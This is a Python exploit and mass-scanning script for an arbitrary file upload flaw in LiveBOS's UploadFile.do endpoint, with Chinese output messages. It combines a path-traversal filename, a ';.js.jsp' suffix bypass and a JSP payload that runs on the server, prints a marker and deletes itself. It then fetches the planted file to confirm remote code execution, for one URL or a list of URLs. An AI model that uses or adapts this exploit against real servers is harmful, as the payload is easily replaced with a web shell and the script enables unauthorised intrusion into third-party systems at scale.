import requests
import argparse

def LiveBOS(url):
    create_url = url+"/feed/UploadFile.do;.js.jsp"
    upload_url = url+"/rce.jsp;.js.jsp"

    data='''
---WebKitFormBoundaryxegqoxxi
Content-Disposition:form-data; name="file"; filename="/../../../../rce.jsp"
Content-Type: image/jpeg
 
<%@ page import="java.io.File" %>
<%
 out.println("pppppppppoooooooocccccccccccc");
 String filePath = application.getRealPath(request.getServletPath());
 new File(filePath).delete();
%>
---WebKitFormBoundaryxegqoxxi--
'''
    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0"
        ,"Content-Type":"multipart/form-data; boundary=----WebKitFormBoundaryxegqoxxi"}

    try:
        req = requests.post(create_url,data=data,headers=headers,timeout=5)
        if(req.status_code==200):
            upload = requests.get(upload_url)
            if "pppppppppoooooooocccccccccccc" in upload.text:
                print(f"{url}存在文件上传漏洞")
                print(upload.text)
            else:
                print("该网址不存在文件上传漏洞")
    except:
        print("该网址无法访问或连接错误")

def LiveBOS_counts(filename):
    try:
        with open(filename,"r") as file:
            readline=file.readlines()
            for urls in readline:
                urls = urls.strip()
                if urls:
                    LiveBOS(urls)
    except:
        print("文件不存在或文件打开发生错误")

def start():
    logo='''   __   _          ___  ____  ____
  / /  (_)  _____ / _ )/ __ \/ __/
 / /__/ / |/ / -_) _  / /_/ /\ \  
/____/_/|___/\__/____/\____/___/  
                                  
    '''
    print(logo)

def main():
    parser = argparse.ArgumentParser(description="LiveBOS UploadFile.do 接口存在任意文件上传漏洞")
    parser.add_argument('-u', type=str, help='检测单个url')
    parser.add_argument('-f', type=str, help='批量检测url列表文件')
    args = parser.parse_args()
    if args.u:
        LiveBOS(args.u)
    elif args.f:
        LiveBOS_counts(args.f)
    else:
        parser.print_help()

if __name__ == "__main__":
    start()
    main()